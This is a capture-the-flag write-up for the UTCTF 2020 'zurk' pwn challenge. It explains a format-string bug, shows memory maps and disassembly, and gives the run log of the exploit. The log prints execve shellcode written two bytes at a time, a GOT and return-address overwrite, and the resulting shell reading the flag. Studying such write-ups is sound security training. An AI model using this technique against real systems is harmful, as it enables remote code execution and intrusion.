[](ctf=utctf-2020)
[](type=pwn)
[](tags=format-string,shellcode)
[](tools=gdb,pwntools,python)

# zurk

We are given a [binary](../pwnable) and [libc](../libc-2.23.so). The binary has
a format string vulnerability and it has lots of exectuable regions.

```sh
gdb-peda$ vmmap
Start              End                Perm      Name
0x00400000         0x00401000         r-xp      /home/jai/Documents/ctf/utctf/pwn/zurk/pwnable
0x00600000         0x00601000         r-xp      /home/jai/Documents/ctf/utctf/pwn/zurk/pwnable
0x00601000         0x00602000         rwxp      /home/jai/Documents/ctf/utctf/pwn/zurk/pwnable
0x00007ffff7dce000 0x00007ffff7f8a000 r-xp      /usr/lib/libc-2.31.so
0x00007ffff7f8a000 0x00007ffff7f8d000 r-xp      /usr/lib/libc-2.31.so
0x00007ffff7f8d000 0x00007ffff7f90000 rwxp      /usr/lib/libc-2.31.so
0x00007ffff7f90000 0x00007ffff7f96000 rwxp      mapped
0x00007ffff7fcd000 0x00007ffff7fd0000 r--p      [vvar]
0x00007ffff7fd0000 0x00007ffff7fd1000 r-xp      [vdso]
0x00007ffff7fd1000 0x00007ffff7ffb000 r-xp      /usr/lib/ld-2.31.so
0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp      /usr/lib/ld-2.31.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp      /usr/lib/ld-2.31.so
0x00007ffff7ffe000 0x00007ffff7fff000 rwxp      mapped
0x00007ffffffde000 0x00007ffffffff000 rwxp      [stack]
0xffffffffff600000 0xffffffffff601000 --xp      [vsyscall]
```

There is a format string vulnerability in the `do_move` function. The binary
reads 0x32 bytes from `stdin` and then passes our input till the first `\n` to
`printf`.

```asm
   0x00000000004006ea <+37>:    call   0x400560 <fgets@plt>
   0x00000000004006ef <+42>:    lea    rax,[rbp-0x40]
   0x00000000004006f3 <+46>:    mov    esi,0x4008b2
   0x00000000004006f8 <+51>:    mov    rdi,rax
   ...
   0x000000000040075b <+150>:   lea    rax,[rbp-0x40]
   0x000000000040075f <+154>:   mov    rdi,rax
   0x0000000000400762 <+157>:   mov    eax,0x0
   0x0000000000400767 <+162>:   call   0x400530 <printf@plt>
```

The 50 byte input size limitation is pretty difficult to get a traditional
attack, like overwriting a `GOT` address, working. The problem is that all the
functions present in the `GOT` are called in every path so we can't use
multiple writes to overwrite a `GOT` entry.

Instead of this, I decidided to place an `execve` shellcode in an executable
region of memory. I used multiple 2 byte writes to do this.

After that, there was a function in the binary at `0x400510` which calls a
`GOT` address. Since this function starts with `0x400...`, I can overwrite the
saved return address using a single write by just writing the last 4 bytes.

```asm
   0x400510:    push   QWORD PTR [rip+0x200af2]        # 0x601008
   0x400516:    jmp    QWORD PTR [rip+0x200af4]        # 0x601010
   0x40051c:    nop    DWORD PTR [rax+0x0]
```

Before that, I wrote the address of the shellcode in the `GOT entry` at
`0x601010`.

The solution script is [here](./solve.py).

```sh
$ python solve.py 
[*] '/home/jai/Documents/ctf/utctf/pwn/zurk/pwnable' 
    Arch:     amd64-64-little
    RELRO:    Partial RELRO                         
    Stack:    No canary found      
    NX:       NX disabled                           
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments                      
[*] '/home/jai/Documents/ctf/utctf/pwn/zurk/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO        
    Stack:    Canary found
    NX:       NX enabled                            
    PIE:      PIE enabled
[+] Opening connection to binary.utctf.live on port 9003: Done
[*] fgets at: 0x7f30bb515ad0
[*] libc base at: 0x7f30bb4a8000
[*] system at: 0x7f30bb4ed390
[*] return address at: 0x7ffed11ae698
[*] writing b'jh' to 0x601800
[*] payload size: 24
[*] writing b'H\xb8' to 0x601802
[*] payload size: 24
[*] writing b'/b' to 0x601804
[*] payload size: 24
[*] writing b'in' to 0x601806
[*] payload size: 24
[*] writing b'//' to 0x601808
[*] payload size: 24
[*] writing b'/s' to 0x60180a
[*] payload size: 48
[*] writing b'PH' to 0x60180c
[*] payload size: 24
[*] writing b'\x89\xe7' to 0x60180e
[*] payload size: 24
[*] writing b'hr' to 0x601810
[*] payload size: 24
[*] writing b'i\x01' to 0x601812
[*] payload size: 24
[*] writing b'\x01\x81' to 0x601814
[*] payload size: 24
[*] writing b'4$' to 0x601816
[*] payload size: 24
[*] writing b'\x01\x01' to 0x601818
[*] payload size: 24
[*] writing b'\x01\x01' to 0x60181a
[*] payload size: 24
[*] writing b'1\xf6' to 0x60181c
[*] payload size: 24
[*] writing b'Vj' to 0x60181e
[*] payload size: 24
[*] writing b'\x08^' to 0x601820
[*] payload size: 24
[*] writing b'H\x01' to 0x601822
[*] payload size: 24
[*] writing b'\xe6V' to 0x601824
[*] payload size: 24
[*] writing b'H\x89' to 0x601826
[*] payload size: 24
[*] writing b'\xe61' to 0x601828
[*] payload size: 24
[*] writing b'\xd2j' to 0x60182a
[*] payload size: 24
[*] writing b';X' to 0x60182c
[*] payload size: 24
[*] writing b'\x0f\x05' to 0x60182e
[*] payload size: 24
[*] payload size: 24
[*] payload size: 24
[*] payload size: 24
[*] payload size: 16
[*] payload size: 24

... 

$ ls
flag.txt
$ cat flag.txt
utflag{wtf_i_h4d_n0_buffer_overflows}
$ 
[*] Interrupted
```
